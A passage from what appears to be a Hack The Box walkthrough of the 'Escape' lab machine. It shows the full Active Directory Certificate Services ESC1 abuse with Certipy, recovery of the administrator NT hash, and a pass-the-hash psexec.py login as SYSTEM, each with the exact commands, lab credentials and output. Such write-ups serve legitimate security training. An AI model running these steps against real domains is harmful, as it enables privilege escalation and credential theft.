    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

<br />

As we can see, the results are the same: 

- Vulnerable Template -> `UserAuthentication`

Next, we'll create the `.pfx` certificate with `req`:

<br />

```bash
❯ certipy req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip '10.10.11.202' -target 'sequel.htb' -ca 'sequel-dc-ca' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 16
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

<br />

Finally we only need to run the following `auth` command and get the hash:

<br />

```bash
❯ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

<br />

Ops! We have an error!

As we can see, the error says that there is a big time difference between our local machine and the Windows system.

We can sync the clock with this command:

<br />

```bash
❯ sudo ntpdate -u sequel.htb
2025-05-04 21:13:26.432265 (+0200) +28693.754536 +/- 0.019893 sequel.htb 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28693.754536
```

<br />

Finally, we run the `auth` command again:

<br />

```bash
❯ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

<br />

Great! We have the hash!

Using `psexec.py` we can connect to the system as `nt authority\system`:

<br />

```bash
❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee administrator@10.10.11.202
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.202.....
[*] Found writable share ADMIN$
[*] Uploading file HGYdPZeF.exe
[*] Opening SVCManager on 10.10.11.202.....
[*] Creating service LAKZ on 10.10.11.202.....
[*] Starting service LAKZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

<br />

Machine Escape pwned!

Keep hacking!❤️❤️

<br />
